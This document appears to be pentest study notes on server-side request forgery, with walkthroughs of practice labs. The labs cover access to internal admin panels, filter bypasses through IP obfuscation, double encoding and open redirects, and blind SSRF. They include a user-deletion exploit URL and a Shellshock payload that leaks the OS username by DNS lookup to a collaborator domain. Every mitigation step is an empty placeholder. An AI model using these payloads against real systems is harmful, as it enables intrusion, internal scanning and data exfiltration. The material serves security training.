# Server side request forgery (SSRF)

This is a web security vulnerability that allows an attacker to cause the server-side application to make requests to an unintended location.

* The attacker can cause the server to make a connection to internal-only services inside the organisation infrastructure.
* The attacker can force the server to connect to arbitrary external systems.
* The attacker can also perform some command execution.
* This could leak sensitive data such as authorization credentials.

## Common SSRF attacks

### SSRF attack against the server

* The attacker causes the application to make HTTP requests back to the server that is hosting the application.
* This happens via the loopback network interface (e.g., hostnames like `127.0.0.1` or `localhost`).

Example: a shopping application lets users view whether an item is in stock in a particular store. To provide stock information, the application queries back-end REST APIs and accepts a URL telling it which back-end API to call.

When the user views stock for an item, their browser makes:

```http
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
```

This causes the server to request that URL and return the stock status. An attacker can modify the request to specify a URL local to the server:

```http
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://localhost/admin
```

The server fetches `/admin` and returns it to the attacker. Although `/admin` is normally protected, requests originating from the local machine may bypass access controls or be treated as trusted.

Why do applications behave this way?

* Access control checks may be implemented in a different component (e.g., a proxy or frontend) and are bypassed when the application makes requests to itself.
* For disaster recovery, applications may allow administrative access from the local machine without logging in.
* Administrative interfaces might listen on different ports not reachable by normal users.

#### Lab: Basic SSRF against the local server

{% stepper %}
{% step %}
### Lab — Introduction

Web\_Pentest300: Pen-tester infiltrates a website with a stock check feature that fetches data from an internal system.
{% endstep %}

{% step %}
### Vulnerability — Problem

Pen-tester searches for vulnerable targets and attempts to access the internal localhost (127.0.0.1) admin interface on port 8080.
{% endstep %}

{% step %}
### Payload & End-goal

Goal: Access user information. Payload used: `127.0.0.1/admin`.
{% endstep %}

{% step %}
### Reconnaissance Plan

* Browse to `/admin` and confirm direct access is denied.
* Visit a product, click "Check stock", intercept the request in Burp Suite and send to Repeater.
{% endstep %}

{% step %}
### Attack

Change the `stockApi` parameter URL to `http://localhost/admin`. This will display the administration interface.
{% endstep %}

{% step %}
### Exploit & Enumerate

* Read returned HTML to find additional paths.
* Try discovered URLs and endpoints in the browser.
{% endstep %}

{% step %}
### Mitigate

(Suggested mitigations—three points.)
{% endstep %}

{% step %}
### Final remarks

Like, Follow & Subscribe (last remarks).
{% endstep %}
{% endstepper %}

***

### SSRF attack against other back-end systems

* Back-end systems often use non-routable private IP addresses and are protected by network topology.
* These services can have weaker security and may expose unauthenticated sensitive functions.
* If you can interact with internal back-end systems via SSRF, you can exploit them.

#### Lab: Basic SSRF against another back-end system

{% stepper %}
{% step %}
### Lab — Introduction

Web\_Pentest301: Target with a stock check feature that fetches from an internal system.
{% endstep %}

{% step %}
### Vulnerability — Problem

Pen-tester searches for vulnerable targets and targets the internal `192.168.0.X` range on port 8080.
{% endstep %}

{% step %}
### Payload & End-goal

Goal: Access user information. Payload used: `http://192.168.0.X`.
{% endstep %}

{% step %}
### Reconnaissance Plan

* Visit the product, click "Check stock", intercept in Burp Suite and send to Intruder.
* Change `stockAPI` to `http://192.168.0.1:8080/admin` and mark the final octet for payloads.
{% endstep %}

{% step %}
### Attack

* In Intruder, set payload type to Numbers with range 1–255 and start the attack.
{% endstep %}

{% step %}
### Exploit & Enumerate

* Sort by status code; look for 200 responses indicating admin interface.
* Send interesting requests to Repeater and change `stockAPI` to paths like `/admin/edit/usernames`.
{% endstep %}

{% step %}
### Mitigate

(Suggested mitigations—three points.)
{% endstep %}

{% step %}
### Final remarks

Like, Follow & Subscribe (last remarks).
{% endstep %}
{% endstepper %}

***

## Circumventing common SSRF defences

Some defenders set up honey pots or simple filters; these can often be bypassed.

### SSRF with blacklist-based input filters

* Applications may block hostnames such as `127.0.0.1`, `localhost`, or sensitive paths like `/admin`.
* Bypass techniques:
  * Use alternative IP representations (e.g., `2130706433`, `017700000001`, `127.1`).
  * Register a domain that resolves to the target.
  * Obfuscate blocked strings using URL encoding or case variations.
  * Provide a URL you control that redirects to the target, trying different redirect codes and protocols (e.g., http -> https).

#### Lab: SSRF with blacklist-based input filter

{% stepper %}
{% step %}
### Lab — Introduction

Web\_Pentest302: Target with stock check feature and weak anti-SSRF defenses.
{% endstep %}

{% step %}
### Vulnerability — Problem

Pen-tester attempts to access the backend; developer deployed two weak anti-SSRF defenses.
{% endstep %}

{% step %}
### Payload & End-goal

Goal: Access the admin interface on localhost. Payloads: `localhost`, `127.1`.
{% endstep %}

{% step %}
### Reconnaissance Plan

* Visit a product, click "Check stock", intercept in Burp Suite and send to Repeater.
* Change `stockApi` to `http://127.0.0.1` and observe blocking.
{% endstep %}

{% step %}
### Attack

* Change URL to `http://127.1/` or `http://127.1/admin` to attempt bypasses.
* If blocked again, try obfuscation techniques.
{% endstep %}

{% step %}
### Exploit & Enumerate

* Double-URL encode characters (e.g., encode `a` as `%2561`) and try `http://127.1/%2561` to access admin interface.
{% endstep %}

{% step %}
### Mitigate

(Suggested mitigations—three points.)
{% endstep %}

{% step %}
### Final remarks

Like, Follow & Subscribe (last remarks).
{% endstep %}
{% endstepper %}

***

### SSRF with whitelist-based input filters

* Some applications only accept input matching a whitelist.
* Whitelist checks that match only the beginning of input or that perform ad-hoc parsing can be bypassed by URL parsing oddities.

URL parsing features often overlooked:

* Embed credentials before hostname: `https://expected-host:fakepassword@evil-host`
* Use `#` to indicate fragments: `https://evil-host#expected-host`
* Use DNS naming hierarchy: `https://expected-host.evil-host`
* URL-encode characters to confuse parsers.
* Double-encode characters where decoders differ between validation and request stages.

#### Lab: SSRF with whitelist-based input filter

{% stepper %}
{% step %}
### Lab — Introduction

Web\_Pentest303: Target with stock check feature and several anti-SSRF defenses.
{% endstep %}

{% step %}
### Vulnerability — Problem

Pen-tester attempts to change the stock check URL; server validates hostnames against a whitelist.
{% endstep %}

{% step %}
### Payload & End-goal

Goal: Access the localhost admin interface. Payload techniques: embedded credentials, `#`, double URL encode.
{% endstep %}

{% step %}
### Reconnaissance Plan

* Visit product, click "Check stock", intercept and send to Repeater.
* Change `stockApi` to `http://127.0.0.1/` and observe the whitelist validation.
{% endstep %}

{% step %}
### Attack

* Try `http://username@stock.weliketoshop.net/` — accepted if parser supports embedded credentials.
* Append a `#` — observe rejection.
{% endstep %}

{% step %}
### Exploit & Enumerate

* Double-URL encode `#` to `%2523`. You might see internal server errors indicating the server attempted to connect to embedded user info.
* Example exploit URL: `http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos`
{% endstep %}

{% step %}
### Mitigate

(Suggested mitigations—three points.)
{% endstep %}

{% step %}
### Final remarks

Like, Follow & Subscribe (last remarks).
{% endstep %}
{% endstepper %}

***

### Bypassing SSRF filters via open redirection

* If user-submitted URLs are strictly validated, an open redirect on an allowed domain can be abused: the application requests a URL on the allowed domain which responds with a redirect to an internal target. If the HTTP client follows redirects, the server will request the redirected target.

Example:

```http
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
```

The app validates `stockApi` is on an allowed domain, requests it, the allowed domain responds with a redirect to `http://192.168.0.68/admin`, and the server follows the redirect — resulting in SSRF.

#### Lab: SSRF with filter bypass via open redirection vulnerability

{% stepper %}
{% step %}
### Lab — Introduction

Web\_Pentest304: Target with stock checker restricted to access only local application.
{% endstep %}

{% step %}
### Vulnerability — Problem

Pen-tester searches for open redirects on the application to bypass SSRF filters.
{% endstep %}

{% step %}
### Payload & End-goal

Goal: Find an open redirect and access the admin interface via the redirect.
{% endstep %}

{% step %}
### Reconnaissance Plan

* Visit a product, click "Check stock", intercept in Burp and send to Repeater.
* Tamper with `stockAPI`; requests to backend are blocked.
* Check "next product" links and observe a `path` parameter placed into a Location header (open redirect).
{% endstep %}

{% step %}
### Attack

* Craft a URL that triggers the open redirect to the admin interface and supply it to `stockApi`, for example: `/product/nextProduct?path=http://192.168.0.12:8080/admin`
* The stock checker follows the redirection and shows the admin page.
{% endstep %}

{% step %}
### Exploit & Enumerate

* Adjust the redirected path to target specific admin endpoints (e.g., `/admin/edit?username`).
{% endstep %}

{% step %}
### Mitigate

(Suggested mitigations—three points.)
{% endstep %}

{% step %}
### Final remarks

Like, Follow & Subscribe (last remarks).
{% endstep %}
{% endstepper %}

Reference: https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf

***

## Blind SSRF vulnerabilities

* Blind SSRF occurs when you can cause a backend request but the response is not returned to the client.
* Harder to exploit, but can sometimes lead to remote code execution on the server or other back-end components.

### Finding hidden attack surface for SSRF

* Many SSRF vulnerabilities are visible in parameters that accept full URLs, but other attack surfaces exist:

Partial URLs in requests

* Some applications accept only a hostname or part of a path and append the remainder server-side. This reduces control and complicates exploitation.

URLs within data formats

* Data formats (e.g., XML) may contain URLs that the server-side parser will fetch. This can combine with XXE to enable SSRF.

SSRF via the Referer header

* Server-side analytics or URL fetchers that process the Referer header can introduce SSRF surface: the application may request or analyze the referring URL.

## How to find and exploit Blind SSRF vulnerabilities

* Use out-of-band (OOB/OSAT) techniques: attempt to trigger an HTTP/DNS request to a controlled external system and monitor interactions.
* Burp Collaborator is a common tool to generate unique domains and detect server-initiated interactions.
* Note: Often you will observe a DNS lookup to the supplied collaborator domain even if no HTTP request is visible.

#### Lab: Blind SSRF with out-of-band detection

{% stepper %}
{% step %}
### Lab — Introduction

Web\_Pentest305: Find analytics software that fetches the Referer header URL when a product page is loaded.
{% endstep %}

{% step %}
### Vulnerability — Problem

The application can connect back to a supplied server we control.
{% endstep %}

{% step %}
### Payload & End-goal

Goal: Cause an HTTP request to a public Burp Collaborator server. Payload: Burp Collaborator.
{% endstep %}

{% step %}
### Reconnaissance Plan

* Visit a product, intercept a request, send to Repeater.
* In Repeater, select the Referer header, right-click and choose "Insert Collaborator Payload" to replace the domain with a unique collaborator domain, then send.
{% endstep %}

{% step %}
### Attack

* In Burp Collaborator tab, click "Poll now" (wait a few seconds if necessary because the server-side action may be asynchronous).
{% endstep %}

{% step %}
### Exploit & Enumerate

* Observe DNS and HTTP interactions initiated by the application as a result of the payload.
{% endstep %}

{% step %}
### Mitigate

(Suggested mitigations—three points.)
{% endstep %}

{% step %}
### Final remarks

This detection can be used to sweep internal IP address space using payloads designed to detect known vulnerabilities.

Like, Follow & Subscribe (last remarks).
{% endstep %}
{% endstepper %}

***

#### Lab: Blind SSRF with Shellshock exploitation

{% stepper %}
{% step %}
### Lab — Introduction

Web\_Pentest306: Use Referer-based fetches to connect back to supplied servers (and internal hosts).
{% endstep %}

{% step %}
### Vulnerability — Problem

The application will fetch Referer header URLs and can connect back to servers we control or internal addresses (e.g., `192.168.0.X:8080`).
{% endstep %}

{% step %}
### Payload & End-goal

Goal: Exfiltrate the OS username and check for other vulnerabilities. Payloads: Shellshock payload + Burp Collaborator.
{% endstep %}

{% step %}
### Reconnaissance Plan

* Install "Collaborator Everywhere" from BApp Store in Burp Suite Pro.
* Add target domain to Burp's target scope and browse the site.
* Identify pages that cause collaborator interactions via Referer.
* Send the request to Intruder.
{% endstep %}

{% step %}
### Attack

* Generate a unique Burp collaborator payload.
* Use a Shellshock-style payload with collaborator domain, e.g.: `() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN`
* Replace the User-Agent or Referer with the payload.
* In Intruder, set up an IP sweep for `192.168.0.1:8080` by marking the final octet and using a Numbers payload from 1 to 255.
* Start the attack.
{% endstep %}

{% step %}
### Exploit & Enumerate

* After the attack, poll the Collaborator tab. You should see DNS interactions initiated by the backend; the OS username may appear as a subdomain in the DNS lookup.
{% endstep %}

{% step %}
### Mitigate

(Suggested mitigations—three points.)
{% endstep %}

{% step %}
### Final remarks

Like, Follow & Subscribe (last remarks).
{% endstep %}
{% endstepper %}

***

End of notes.
